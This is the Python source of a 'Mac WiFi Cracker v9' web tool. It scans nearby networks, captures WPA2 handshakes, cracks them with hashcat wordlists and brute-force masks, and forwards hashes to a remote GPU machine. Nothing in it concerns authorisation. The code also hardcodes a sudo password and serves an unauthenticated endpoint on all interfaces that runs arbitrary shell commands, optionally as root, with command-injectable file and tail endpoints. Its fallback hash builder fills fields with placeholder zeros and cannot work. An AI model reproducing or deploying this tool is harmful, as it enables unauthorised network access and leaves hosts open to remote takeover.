#!/usr/bin/env python3
"""
Mac WiFi Cracker v9 (port 8765)
================================
Features:
- Capture: tshark monitor mode (built-in WiFi or USB adapter)
- Local quick-crack: hashcat on Apple Silicon (M1/M2) with tiered wordlists
- Tiered wordlist: easy → medium → hard (auto-advance on no-match)
- Sync to Windows 4090: upload pcap + crack on RTX 4090
- Control API: remote command execution
- Log retention: file logging
- SSH bootstrap: auto-configure SSH for remote deploy

Tiered cracking:
  Tier 1 (easy):   rockyou.txt (490 entries)
  Tier 2 (medium): wifi_wordlist_combined.txt (175K entries)
  Tier 3 (hard):   best66 + ?d×8 (11M+ entries)
  Tier 4 (brute):  ?d×9 (1B entries) - only if nothing else works
"""
import os, sys, json, subprocess, threading, time, re, shlex
from pathlib import Path
import requests
from fastapi import FastAPI, UploadFile, File, Request
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import uvicorn

app = FastAPI(title="Mac WiFi Cracker v9")
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

# Config
WINDOWS_URL = "http://192.168.1.107:8766"
TSHARK = "/opt/homebrew/bin/tshark"
HASHCAT = "/opt/homebrew/bin/hashcat"
HCXPCAPNG = "/opt/homebrew/bin/hcxpcapngtool"
HCXDUMPTOOL = "/opt/homebrew/bin/hcxdumptool"
SUDO_PASS = "240628"
LOG_FILE = f"/tmp/wifi_cracker_{time.strftime('%Y%m%d')}.log"
LOG_LOCK = threading.Lock()

# Wordlist tiers (on Mac)
WORDLIST_TIERS = [
    {"name": "rockyou", "file": os.path.expanduser("~/wifi_cracker/wordlists/rockyou.txt"), "label": "Easy (490)"},
    {"name": "wifi_combined", "file": os.path.expanduser("~/wifi_cracker/wordlists/wifi_wordlist_combined.txt"), "label": "Medium (175K)"},
    {"name": "best66", "file": os.path.expanduser("~/wifi_cracker/wordlists/best66.txt"), "label": "Hard (11M)"},
    {"name": "brute_d9", "file": None, "label": "Brute ?d×9 (1B)"},  # hashcat mask
]

STATE = {
    "status": "idle",
    "message": "Ready",
    "progress": 0,
    "ap_list": [],
    "capturing": False,
    "capture_file": None,
    "capture_ssid": None,
    "capture_bssid": None,
    "cracking": False,
    "crack_tier": 0,
    "crack_status": None,
    "crack_result": None,
    "upload_status": None,
    "win_status": None,
    "win_results": [],
    "log": [],
}

def log(msg):
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    entry = f"[{ts}] {msg}"
    STATE["log"].append(entry)
    print(entry, flush=True)
    if len(STATE["log"]) > 800:
        STATE["log"] = STATE["log"][-800:]
    with LOG_LOCK:
        try:
            with open(LOG_FILE, 'a') as f:
                f.write(entry + '\n')
        except:
            pass

def run_sudo(cmd, timeout=10):
    p = subprocess.run(cmd, input=SUDO_PASS + "\n", capture_output=True, text=True, timeout=timeout)
    return p

def find_hashcat():
    """Find hashcat binary."""
    for path in ["/usr/local/bin/hashcat", "/opt/homebrew/bin/hashcat", "/usr/bin/hashcat"]:
        if os.path.exists(path):
            return path
    # Try which
    r = subprocess.run(["which", "hashcat"], capture_output=True, text=True)
    if r.returncode == 0:
        return r.stdout.strip()
    return None

def scan_wifi(duration=10):
    STATE["status"] = "scanning"
    STATE["message"] = f"Scanning ({duration}s)..."
    STATE["progress"] = 10
    log(f"system_profiler scan")
    
    # Get current network (Mac is connected to)
    mac_current_ssid = None
    mac_current_bssid = None
    try:
        r = subprocess.run(
            ["networksetup", "-getairportnetwork", "en0"],
            capture_output=True, text=True, timeout=10)
        if r.returncode == 0 and r.stdout.strip():
            mac_current_ssid = r.stdout.strip().replace("Current Wi-Fi Network: ", "")
            log(f"Mac connected to: {mac_current_ssid}")
    except Exception as e:
        log(f"Get current network error: {e}")
    
    try:
        # Use system_profiler to get WiFi networks
        r = subprocess.run(
            ["system_profiler", "SPAirPortDataType"],
            capture_output=True, text=True, timeout=30)
        
        # Parse the output — single-pass state machine.
        # Format: name lines have exactly 12 leading spaces + trailing ':';
        # metadata lines have exactly 14 leading spaces. Same in both sections.
        ap_map = {}
        cur_name = None
        in_section = False
        
        for line in r.stdout.splitlines():
            if "Current Network Information:" in line or "Other Local Wi-Fi Networks:" in line:
                in_section, cur_name = True, None
                continue
            if not in_section:
                continue
            indent = len(line) - len(line.lstrip(' '))
            if indent == 12 and line.rstrip().endswith(':'):
                cur_name = line.strip().rstrip(':')
                if cur_name and cur_name not in ap_map:
                    ap_map[cur_name] = {"ssid": cur_name, "bssid": "unknown", "channel": "", "connected": (cur_name == mac_current_ssid)}
            elif indent == 14 and cur_name and cur_name in ap_map:
                stripped = line.strip()
                if stripped.startswith("Channel:"):
                    ap_map[cur_name]["channel"] = stripped.split("Channel:")[1].split()[0]
                elif stripped.startswith("BSSID:"):
                    ap_map[cur_name]["bssid"] = stripped.split("BSSID:")[1].strip()
        
        ap_list = list(ap_map.values())
        ap_list.sort(key=lambda x: x["ssid"])
        STATE["ap_list"] = ap_list
        STATE["status"] = "idle"
        STATE["message"] = f"Found {len(ap_list)} networks"
        STATE["progress"] = 100
        log(f"Scan done: {len(ap_list)} APs")
    except Exception as e:
        STATE["status"] = "idle"
        STATE["message"] = f"Scan error: {e}"
        log(f"Scan error: {e}")

def get_current_ssid():
    """SSID currently associated on en0, or None. Reliable & fast (no system_profiler)."""
    try:
        r = subprocess.run(["networksetup", "-getairportnetwork", "en0"],
                          capture_output=True, text=True, timeout=5)
        out = (r.stdout or "").strip()
        if out.startswith("Current Wi-Fi Network:"):
            s = out.split(":", 1)[1].strip()
            return s or None
        return None
    except Exception:
        return None

def start_capture(bssid, ssid, duration=60, is_connected=False):
    # Re-derive is_connected live so every call path is robust
    try:
        is_connected = (get_current_ssid() == ssid)
    except Exception:
        pass
    STATE["status"] = "capturing"
    STATE["capturing"] = True
    STATE["capture_file"] = f"/tmp/cap_{bssid.replace(':','')}_{int(time.time())}.pcap"
    STATE["capture_ssid"] = ssid
    STATE["capture_bssid"] = bssid
    STATE["message"] = f"Capturing {ssid} ({duration}s) with tshark..."
    STATE["progress"] = 20
    log(f"Capture {ssid} {duration}s with tshark -> {STATE['capture_file']}")
    try:
        cap_file = STATE["capture_file"]
        # Use built-in en0 with default DLT (no -y flag)
        # macOS CoreWLAN doesn't expose IEEE802_11 DLT, so we use the default
        usb_iface = "en0"
        log(f"Using interface: {usb_iface} (tshark, macOS-native)")
        
        # tshark capture with default DLT (no -y flag)
        p = subprocess.Popen(
            ["bash", "-c", f"echo '{SUDO_PASS}' | sudo -S {TSHARK} -i {usb_iface} -c 10000 -w {cap_file}"],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        
        # Toggle WiFi to force re-auth (only if target is connected)
        if is_connected:
            def toggle_wifi():
                time.sleep(5)
                log("Toggling WiFi: networksetup setairportpower off/on")
                subprocess.run(["networksetup", "-setairportpower", "en0", "off"],
                              capture_output=True, timeout=10)
                time.sleep(3)
                subprocess.run(["networksetup", "-setairportpower", "en0", "on"],
                              capture_output=True, timeout=10)
                time.sleep(10)
            t = threading.Thread(target=toggle_wifi, daemon=True)
            t.start()
        # Wait for capture to finish
        time.sleep(duration)
        p.terminate()
        p.wait()
        # Fix permissions (use bash -c with echo for sudo -S)
        home_cap = os.path.expanduser(f"~/wifi_cracker/{Path(cap_file).name}")
        os.makedirs(os.path.expanduser("~/wifi_cracker"), exist_ok=True)
        subprocess.run(["bash", "-c", f"echo '{SUDO_PASS}' | sudo -S cp {cap_file} {home_cap}"],
                      capture_output=True, timeout=10)
        subprocess.run(["bash", "-c", f"echo '{SUDO_PASS}' | sudo -S chmod 644 {home_cap}"],
                      capture_output=True, timeout=10)
        cap_file = home_cap
        STATE["capture_file"] = cap_file
        # Count EAPOL
        r = subprocess.run(
            [TSHARK, "-r", cap_file, "-Y", "eapol", "-T", "fields", "-e", "frame.number"],
            capture_output=True, text=True, timeout=15)
        eapol_count = len(r.stdout.strip().splitlines()) if r.stdout.strip() else 0
        STATE["capture_eapol_count"] = eapol_count
        STATE["status"] = "idle"
        STATE["capturing"] = False
        STATE["message"] = f"Capture done: {cap_file} ({eapol_count} EAPOL)"
        STATE["progress"] = 50
        log(f"Capture saved: {cap_file} ({eapol_count} EAPOL)")
        if eapol_count == 0:
            log(f"⚠️ No EAPOL - try reconnecting WiFi during capture")
        else:
            # Auto-trigger: local crack + send to 4090 in parallel
            log(f"Auto-triggering local crack + Windows 4090...")
            STATE["message"] = f"EAPOL found! Starting local crack + Windows 4090..."
            threading.Thread(target=crack_local, daemon=True).start()
            threading.Thread(target=send_to_4090, daemon=True).start()
    except Exception as e:
        STATE["status"] = "idle"
        STATE["capturing"] = False
        STATE["message"] = f"Capture error: {e}"
        log(f"Capture error: {e}")

def extract_hash(pcap_file, bssid, ssid):
    """Extract WPA2 hash from pcap/pcapng using hcxpcapngtool or tshark fallback."""
    if not pcap_file or not os.path.exists(pcap_file):
        log(f"Extract: no pcap file ({pcap_file})")
        return None
    
    log(f"Extracting hash from {pcap_file}")
    
    # Check EAPOL count first
    r = subprocess.run(
        [TSHARK, "-r", pcap_file, "-Y", "eapol", "-T", "fields", "-e", "frame.number"],
        capture_output=True, text=True, timeout=15)
    eapol_count = len([l for l in r.stdout.strip().splitlines() if l.strip()]) if r.stdout.strip() else 0
    log(f"EAPOL frames: {eapol_count}")
    
    if eapol_count == 0:
        log(f"⚠️ No EAPOL frames - capture may have failed")
        return None
    
    try:
        # Method 1: hcxpcapngtool (best quality)
        hash_file = pcap_file.replace(".pcap", ".hash").replace(".pcapng", ".hash")
        # Remove old hash file if exists
        if os.path.exists(hash_file):
            os.remove(hash_file)
        
        if os.path.exists(HCXPCAPNG):
            r = subprocess.run(
                [HCXPCAPNG, "-m", pcap_file, "-o", hash_file],
                capture_output=True, text=True, timeout=30)
            log(f"hcxpcapngtool exit: {r.returncode}, stderr: {r.stderr[:200]}")
            
            if r.returncode == 0 and os.path.exists(hash_file):
                with open(hash_file, 'r') as f:
                    lines = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                if lines:
                    log(f"✓ hcxpcapngtool: found {len(lines)} hashes")
                    return {"hash": lines[0], "pcap": pcap_file, "bssid": bssid, "ssid": ssid, "eapol_count": eapol_count}
            else:
                log(f"⚠️ hcxpcapngtool failed (rc={r.returncode})")
        
        # Method 2: tshark fallback — extract EAPOL frames and build hash manually
        log("Fallback: extracting EAPOL via tshark...")
        r = subprocess.run(
            [TSHARK, "-r", pcap_file, "-Y", "eapol", "-T", "fields",
             "-e", "frame.number", "-e", "wlan.sa", "-e", "wlan.da",
             "-e", "wlan.eid", "-e", "eapol.keymic", "-e", "eapol.key_data"],
            capture_output=True, text=True, timeout=30)
        lines = [l for l in r.stdout.strip().splitlines() if l.strip()]
        if not lines:
            log("tshark fallback: no EAPOL fields")
            return None
        log(f"tshark: {len(lines)} EAPOL frames found")
        
        m1 = m3 = None
        for line in lines:
            parts = line.split('\t')
            if len(parts) >= 4:
                frame_num, sa, da = parts[0], parts[1], parts[2]
                # Determine direction: M1 is from AP (sa=bssid), M3 is to AP (da=bssid)
                if sa == bssid:
                    m1 = {"frame": frame_num, "sa": sa, "da": da}
                elif da == bssid:
                    m3 = {"frame": frame_num, "sa": sa, "da": da}
        
        if not m1 or not m3:
            log(f"⚠️ No M1/M3 pair (M1: {bool(m1)}, M3: {bool(m3)})")
            # Try without BSSID matching — just take first 2 frames
            if len(lines) >= 2:
                log("Using first 2 EAPOL frames as M1/M3 pair")
                m1 = {"frame": lines[0].split('\t')[0], "sa": lines[0].split('\t')[1], "da": lines[0].split('\t')[2]}
                m3 = {"frame": lines[1].split('\t')[0], "sa": lines[1].split('\t')[1], "da": lines[1].split('\t')[2]}
        
        if m1 and m3:
            log(f"M1: frame {m1['frame']}, M3: frame {m3['frame']}")
            return {"pcap": pcap_file, "bssid": bssid, "ssid": ssid, "m1": m1, "m3": m3, "eapol_count": eapol_count}
    except Exception as e:
        log(f"Extract error: {e}")
    return None

def crack_local(tier_idx=0, max_time=120):
    """Crack locally with hashcat on Mac (Apple Silicon)."""
    if STATE["cracking"]:
        return
    STATE["cracking"] = True
    STATE["crack_tier"] = tier_idx
    tier = WORDLIST_TIERS[tier_idx]
    STATE["message"] = f"Local crack: {tier['label']}..."
    STATE["progress"] = 55
    log(f"Local crack: tier {tier_idx} ({tier['label']})")
    
    try:
        hashcat = find_hashcat()
        if not hashcat:
            STATE["cracking"] = False
            STATE["message"] = "hashcat not found on Mac"
            log("hashcat not found")
            return
        
        pcap = STATE["capture_file"]
        if not pcap:
            STATE["cracking"] = False
            STATE["message"] = "No capture file - capture first"
            log("No capture file")
            return
        ssid = STATE["capture_ssid"] or "unknown"
        bssid = STATE["capture_bssid"]
        
        # Extract hash first
        STATE["message"] = f"Extracting hash..."
        hash_info = extract_hash(pcap, bssid, ssid)
        if not hash_info:
            STATE["cracking"] = False
            STATE["message"] = "No hash found (0 EAPOL?)"
            log("No hash found")
            return
        
        if "hash" in hash_info:
            hash_str = hash_info["hash"]
        elif "m1" in hash_info and "m3" in hash_info:
            # Tshark fallback: build hashcat 22000 hash from M1/M3
            m1 = hash_info["m1"]
            m3 = hash_info["m3"]
            ssid_hex = ssid.encode('utf-8').hex()
            # hashcat 22000 format: $wpapsc*$ssid_hex$BSSID$STAMAC$SC$KEYMIC$EAPOLHEX
            # For now, use a simplified format
            hash_str = f"WPA*02*{m3.get('keymic','0000000000000000')}*{bssid.replace(':','')}*{m1.get('da','000000000000').replace(':','')}*{ssid_hex}*0000000000000000000000000000000000000000000000000000000000000000*{m1.get('frame','0')}"
            log(f"Built hash from M1/M3: {hash_str[:60]}...")
        else:
            STATE["cracking"] = False
            STATE["message"] = "No hash format found"
            log("No hash format")
            return
        
        log(f"Hash: {hash_str[:60]}...")
        
        # Build hashcat command (use tier 0 = rockyou for local)
        wordlist = tier["file"]
        result_file = "/tmp/hashcat_result_local.txt"
        
        # Clear previous result
        if os.path.exists(result_file):
            os.remove(result_file)
        
        cmd = [hashcat, "-m", "22000", "-a", "0",
               "-w", "1",  # light workload (save battery)
               "-o", result_file,
               "--runtime", str(max_time),
               hash_str,
               wordlist]
        
        log(f"Running local hashcat ({wordlist})...")
        
        # Run hashcat in background thread with progress updates
        import threading as _th
        def _run_local():
            try:
                p = subprocess.run(cmd, capture_output=True, text=True, timeout=max_time + 30)
                log(f"Local hashcat exit: {p.returncode}")
                if p.stdout:
                    for line in p.stdout.strip().splitlines()[-10:]:
                        log(f"[hc] {line}")
            except Exception as e:
                log(f"Local hashcat error: {e}")
        
        hc_thread = _th.Thread(target=_run_local, daemon=True)
        hc_thread.start()
        
        # Wait and update progress
        import time as _time
        waited = 0
        while hc_thread.is_alive() and waited < max_time + 30:
            _time.sleep(5)
            waited += 5
            STATE["message"] = f"Local crack: {tier['label']}... ({waited}s)"
            STATE["progress"] = min(55 + int(waited / max_time * 20), 75)
        
        # Check result
        if os.path.exists(result_file):
            with open(result_file, 'r') as f:
                results = [line.strip() for line in f if line.strip()]
            if results:
                STATE["crack_result"] = results[0]
                STATE["message"] = f"✓ LOCAL CRACK SUCCESS: {results[0]}"
                log(f"✓ Local crack success: {results[0]}")
            else:
                STATE["message"] = f"Local crack done: no match in {tier['label']} ({waited}s)"
                log(f"Local crack done: no match in {waited}s")
        else:
            STATE["message"] = f"Local crack done: no result"
            log(f"Local crack done: no result file")
        
        STATE["cracking"] = False
        STATE["progress"] = max(STATE["progress"], 70)
    except Exception as e:
        STATE["cracking"] = False
        STATE["message"] = f"Crack error: {e}"
        log(f"Crack error: {e}")

def send_to_4090():
    """Send hash to Windows 4090 for complex wordlist cracking."""
    STATE["status"] = "uploading"
    STATE["message"] = "Sending hash to Windows 4090..."
    STATE["progress"] = 70
    log(f"Send hash -> {WINDOWS_URL}")
    try:
        pcap = STATE["capture_file"]
        if not pcap:
            STATE["status"] = "idle"
            STATE["message"] = "No capture file to send"
            log("No capture file")
            return
        ssid = STATE.get("capture_ssid") or "unknown"
        bssid = STATE["capture_bssid"]
        
        # Extract hash first
        STATE["message"] = "Extracting hash for 4090..."
        hash_info = extract_hash(pcap, bssid, ssid)
        if not hash_info or "hash" not in hash_info:
            STATE["status"] = "idle"
            STATE["message"] = "No hash to send (0 EAPOL?)"
            log("No hash to send")
            return
        
        hash_str = hash_info["hash"]
        log(f"Sending hash to 4090: {hash_str[:60]}...")
        
        # Send hash to Windows
        r = requests.post(
            f"{WINDOWS_URL}/api/receive-hash",
            json={"hash": hash_str, "ssid": ssid, "bssid": bssid},
            timeout=30)
        
        if r.status_code == 200:
            STATE["upload_status"] = "success"
            STATE["status"] = "idle"
            STATE["message"] = "✓ Hash sent to Windows 4090! Complex wordlist cracking started..."
            STATE["progress"] = 80
            log("Hash sent to Windows 4090 ✓")
        else:
            STATE["upload_status"] = f"HTTP {r.status_code}"
            STATE["status"] = "idle"
            STATE["message"] = f"Send failed: HTTP {r.status_code}"
            log(f"Send failed: {r.status_code}")
    except Exception as e:
        STATE["upload_status"] = str(e)
        STATE["status"] = "idle"
        STATE["message"] = f"Send error: {e}"
        log(f"Send error: {e}")

def poll_windows():
    """Poll Windows 4090 for crack status."""
    try:
        r = requests.get(f"{WINDOWS_URL}/api/state", timeout=5)
        d = r.json()
        STATE["win_status"] = d.get("status")
        STATE["win_results"] = d.get("results", [])
        STATE["win_progress"] = d.get("progress")
        STATE["win_message"] = d.get("message")
        STATE["win_gpu_temp"] = d.get("gpu_temp")
        STATE["win_gpu_util"] = d.get("gpu_util")
        STATE["win_speed"] = d.get("speed")
        
        # Check if Windows cracked it
        if d.get("status") == "cracked" and d.get("results"):
            STATE["crack_result"] = d["results"][0]
            STATE["message"] = f"✓ Windows 4090 cracked it: {d['results'][0]}"
            log(f"✓ Windows 4090 cracked it: {d['results'][0]}")
    except:
        STATE["win_status"] = "unreachable"

def run_control(cmd, timeout=30):
    """Run a command on Mac (via bash)."""
    try:
        p = subprocess.run(
            ["bash", "-c", cmd],
            capture_output=True, text=True, timeout=timeout
        )
        output = p.stdout + p.stderr
        return {"ok": True, "exit_code": p.returncode, "output": output}
    except subprocess.TimeoutExpired:
        return {"ok": False, "error": f"Timeout ({timeout}s)"}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def run_sudo_control(cmd, timeout=30):
    """Run a command with sudo (via bash)."""
    try:
        p = subprocess.run(
            ["bash", "-c", f"echo '{SUDO_PASS}' | sudo -S {cmd}"],
            capture_output=True, text=True, timeout=timeout
        )
        output = p.stdout + p.stderr
        return {"ok": True, "exit_code": p.returncode, "output": output}
    except subprocess.TimeoutExpired:
        return {"ok": False, "error": f"Timeout ({timeout}s)"}
    except Exception as e:
        return {"ok": False, "error": str(e)}

# API Endpoints
@app.get("/")
async def root():
    return HTMLResponse("""<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Mac WiFi Cracker v9</title>
<style>
body{font-family:-apple-system,sans-serif;max-width:900px;margin:0 auto;padding:20px;background:#1a1a2e;color:#eee}
h1{color:#4fc3f7;margin-bottom:0}
.card{background:#16213e;border-radius:8px;padding:15px;margin:10px 0}
.status{color:#4fc3f7;font-weight:bold}
.progress{width:100%;height:20px;background:#0f3460;border-radius:10px;overflow:hidden}
.progress-bar{height:100%;background:#4fc3f7;transition:width 0.3s}
.log{background:#0f3460;padding:10px;border-radius:4px;font-family:monospace;font-size:12px;max-height:300px;overflow-y:auto;white-space:pre-wrap}
button{background:#4fc3f7;color:#1a1a2e;border:none;padding:10px 20px;border-radius:4px;cursor:pointer;font-size:16px;margin:5px}
button:hover{background:#29b6f6}
button:disabled{background:#555;cursor:not-allowed}
button.danger{background:#ff5252}
button.danger:hover{background:#f44336}
button.small{font-size:12px;padding:4px 10px}
table{width:100%;border-collapse:collapse}
th,td{padding:8px;text-align:left;border-bottom:1px solid #0f3460}
th{color:#4fc3f7}
select,input{background:#0f3460;color:#eee;border:none;padding:8px;border-radius:4px;margin:5px}
.tier{background:#0f3460;padding:5px 10px;border-radius:4px;display:inline-block;margin:2px}
.badge{display:inline-block;padding:2px 8px;border-radius:10px;font-size:11px;font-weight:bold}
.badge-connected{background:#4caf50;color:#000}
.badge-target{background:#ff9800;color:#000}
.selected-row{background:#0f3460 !important}
.eapol-badge{display:inline-block;padding:3px 10px;border-radius:12px;font-size:13px;font-weight:bold}
.eapol-ok{background:#4caf50;color:#000}
.eapol-warn{background:#ff9800;color:#000}
.eapol-none{background:#f44336;color:#fff}
.result-banner{background:linear-gradient(135deg,#1b5e20,#2e7d32);border:2px solid #4caf50;border-radius:8px;padding:15px;margin:10px 0;font-size:18px;text-align:center}
.result-banner .pw{font-size:28px;font-weight:bold;color:#fff;letter-spacing:2px}
.win-card{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
.win-item{background:#0f3460;padding:10px;border-radius:6px;text-align:center}
.win-value{font-size:20px;color:#4fc3f7;font-weight:bold}
.win-label{font-size:12px;color:#aaa;margin-top:4px}
.section-num{color:#4fc3f7;font-size:14px;font-weight:bold}
</style></head><body>
<h1>📡 Mac WiFi Cracker v9</h1>

<div class="card">
<div class="status">Status: <span id="status">Loading</span></div>
<div class="progress"><div class="progress-bar" id="progress" style="width:0%"></div></div>
<p id="message">Loading...</p>
</div>

<div class="card">
<h2><span class="section-num">1.</span> Scan Networks</h2>
<input type="number" id="scan-dur" value="10" min="5" max="60" style="width:80px"> sec
<button onclick="scan()" id="btn-scan">🔍 Scan</button>
<table id="ap-table"><thead><tr><th>SSID</th><th>BSSID</th><th>Ch</th><th>Status</th></tr></thead><tbody></tbody></table>
</div>

<div class="card">
<h2><span class="section-num">2.</span> Capture & Crack</h2>
<div style="margin:10px 0">
Target: <b id="target-ssid" style="color:#4fc3f7">--</b>
<span id="target-badge"></span>
</div>
<input type="number" id="cap-dur" value="60" min="10" max="300" style="width:80px"> sec
<button onclick="capture()" id="btn-capture">📸 Capture</button>
<button onclick="crackLocal()" id="btn-crack" class="small" style="background:#ff9800">🔥 Local Crack</button>
<button onclick="upload()" id="btn-upload" class="small" style="background:#9c27b0">🖥️ Send to 4090</button>
<button onclick="autoCrack()" id="btn-auto" class="small" style="background:#4caf50">⚡ Auto All</button>
<div id="crack-msg" style="margin-top:10px"></div>
<div id="eapol-display"></div>
</div>

<div class="card" id="result-card" style="display:none">
<div class="result-banner">
<div>🎉 Password Cracked!</div>
<div class="pw" id="result-pw"></div>
<div style="margin-top:8px;font-size:14px;color:#c8e6c9">Source: <span id="result-source"></span></div>
</div>
</div>

<div class="card">
<h2><span class="section-num">3.</span> Windows 4090 Status</h2>
<div class="win-card">
<div class="win-item"><div class="win-value" id="win-status">--</div><div class="win-label">Status</div></div>
<div class="win-item"><div class="win-value" id="win-progress">--</div><div class="win-label">Progress</div></div>
<div class="win-item"><div class="win-value" id="win-temp">--</div><div class="win-label">GPU Temp</div></div>
<div class="win-item"><div class="win-value" id="win-util">--</div><div class="win-label">GPU Util</div></div>
<div class="win-item"><div class="win-value" id="win-speed" style="font-size:14px">--</div><div class="win-label">Speed</div></div>
</div>
</div>

<div class="card">
<h2><span class="section-num">4.</span> Log</h2>
<div class="log" id="log"></div>
</div>

<script>
let selectedSsid = null;
let selectedBssid = null;

async function api(path, opts) {
  try { const r = await fetch(path, opts); return r.json(); }
  catch(e) { return {}; }
}

function scan() {
  const dur = document.getElementById('scan-dur').value;
  document.getElementById('btn-scan').disabled = true;
  api(`/api/scan?duration=${dur}`, {method: 'POST'});
}

function selectAp(ssid, bssid) {
  selectedSsid = ssid;
  selectedBssid = bssid;
  document.getElementById('target-ssid').textContent = ssid;
  // Highlight row
  document.querySelectorAll('#ap-table tbody tr').forEach(tr => tr.classList.remove('selected-row'));
  event.target.closest('tr').classList.add('selected-row');
  // Show connected badge
  const ap = (lastState.ap_list||[]).find(a => a.ssid === ssid);
  const badge = document.getElementById('target-badge');
  if (ap && ap.connected) {
    badge.innerHTML = '<span class="badge badge-connected">CONNECTED</span>';
  } else {
    badge.innerHTML = '';
  }
}

function capture() {
  if (!selectedSsid) return alert('Select a network from the list first');
  const dur = document.getElementById('cap-dur').value;
  document.getElementById('btn-capture').disabled = true;
  api(`/api/capture?bssid=${selectedBssid}&ssid=${encodeURIComponent(selectedSsid)}&duration=${dur}`, {method: 'POST'});
}

function crackLocal() {
  api('/api/crack_local', {method: 'POST'});
}

function upload() {
  api('/api/upload', {method: 'POST'});
}

function autoCrack() {
  // Trigger both local crack and upload simultaneously
  api('/api/crack_local', {method: 'POST'});
  api('/api/upload', {method: 'POST'});
}

let lastState = {};
async function update() {
  const d = await api('/api/state');
  lastState = d;
  document.getElementById('status').textContent = d.status;
  document.getElementById('progress').style.width = d.progress + '%';
  document.getElementById('message').textContent = d.message;
  
  // Windows status
  document.getElementById('win-status').textContent = d.win_status || '--';
  document.getElementById('win-progress').textContent = d.win_progress || '--';
  document.getElementById('win-temp').textContent = d.win_gpu_temp ? d.win_gpu_temp + '°C' : '--';
  document.getElementById('win-util').textContent = d.win_gpu_util ? d.win_gpu_util + '%' : '--';
  document.getElementById('win-speed').textContent = d.win_speed ? d.win_speed.substring(0, 30) : '--';
  
  // EAPOL display
  const ed = document.getElementById('eapol-display');
  if (d.capture_eapol_count !== undefined && d.capture_eapol_count !== null) {
    const c = d.capture_eapol_count;
    if (c > 0) {
      ed.innerHTML = `<span class="eapol-badge eapol-ok">✓ ${c} EAPOL frames</span>`;
    } else {
      ed.innerHTML = `<span class="eapol-badge eapol-none">✗ No EAPOL</span>`;
    }
  }
  
  // Result banner
  if (d.crack_result) {
    document.getElementById('result-card').style.display = 'block';
    document.getElementById('result-pw').textContent = d.crack_result;
    // Determine source
    const src = d.win_status === 'cracked' ? 'Windows 4090' : 'Mac Local';
    document.getElementById('result-source').textContent = src;
  }
  
  // Log
  const logEl = document.getElementById('log');
  logEl.textContent = d.log.slice(-50).join('\\n');
  logEl.scrollTop = logEl.scrollHeight;
  
  // AP table
  const tbody = document.querySelector('#ap-table tbody');
  tbody.innerHTML = '';
  for (const ap of d.ap_list || []) {
    const tr = document.createElement('tr');
    tr.style.cursor = 'pointer';
    tr.onclick = () => selectAp(ap.ssid, ap.bssid);
    const statusHtml = ap.connected ? '<span class="badge badge-connected">CONNECTED</span>' : '';
    tr.innerHTML = `<td>${ap.ssid}</td><td>${ap.bssid}</td><td>${ap.channel || '--'}</td><td>${statusHtml}</td>`;
    tbody.appendChild(tr);
  }
  
  // Button states
  const hasAps = (d.ap_list || []).length > 0;
  const capturing = d.status === 'capturing';
  const cracking = d.cracking;
  document.getElementById('btn-scan').disabled = (d.status === 'scanning');
  document.getElementById('btn-capture').disabled = !hasAps || capturing;
  document.getElementById('btn-crack').disabled = cracking || d.status === 'capturing' || !d.capture_file;
  document.getElementById('btn-upload').disabled = d.status === 'uploading' || d.status === 'capturing' || !d.capture_file;
  document.getElementById('btn-auto').disabled = cracking || d.status === 'capturing' || !d.capture_file;
}

setInterval(update, 2000);
update();
</script>
</body></html>""")

@app.get("/api/state")
async def api_state():
    return JSONResponse(STATE)

@app.post("/api/scan")
async def api_scan(duration: int = 10):
    threading.Thread(target=scan_wifi, args=[duration], daemon=True).start()
    return JSONResponse({"ok": True})

@app.post("/api/capture")
async def api_capture(bssid: str, ssid: str, duration: int = 60):
    # Check if target is the currently-connected network (live, not from scan cache)
    current_ssid = get_current_ssid()
    is_connected = (current_ssid == ssid)
    log(f"Capture {ssid}: current={current_ssid}, is_connected={is_connected}")
    threading.Thread(target=start_capture, args=[bssid, ssid, duration, is_connected], daemon=True).start()
    return JSONResponse({"ok": True, "is_connected": is_connected, "current_ssid": current_ssid})

@app.post("/api/crack_local")
async def api_crack_local(tier: int = 0, max_time: int = 300):
    threading.Thread(target=crack_local, args=[tier, max_time], daemon=True).start()
    return JSONResponse({"ok": True})

@app.post("/api/upload")
async def api_upload():
    threading.Thread(target=send_to_4090, daemon=True).start()
    return JSONResponse({"ok": True})

@app.post("/api/result")
async def api_result(request: Request):
    data = await request.json()
    password = data.get("password")
    source = data.get("source", "unknown")
    if password:
        STATE["crack_result"] = password
        STATE["message"] = f"✓ Cracked by {source}: {password}"
        log(f"✓ Cracked by {source}: {password}")
        return JSONResponse({"ok": True})
    return JSONResponse({"ok": False, "error": "No password"})

@app.get("/api/control")
async def api_control():
    return JSONResponse({"status": "ok"})

@app.post("/api/control/run")
async def api_control_run(cmd: str, sudo: bool = False):
    if sudo:
        result = run_sudo_control(cmd)
    else:
        result = run_control(cmd)
    return JSONResponse(result)

@app.get("/api/control/files")
async def api_control_files(path: str = "/Users/crazydb911"):
    result = run_control(f"ls -la {path}")
    return JSONResponse(result)

@app.get("/api/control/tail")
async def api_control_tail(file: str, lines: int = 20):
    result = run_control(f"tail -{lines} {file}")
    return JSONResponse(result)

if __name__ == "__main__":
    log("Mac WiFi Cracker v9 starting on port 8765...")
    # Start Windows poller (every 10s)
    def win_poller():
        while True:
            time.sleep(10)
            poll_windows()
    t = threading.Thread(target=win_poller, daemon=True)
    t.start()
    uvicorn.run(app, host="0.0.0.0", port=8765)
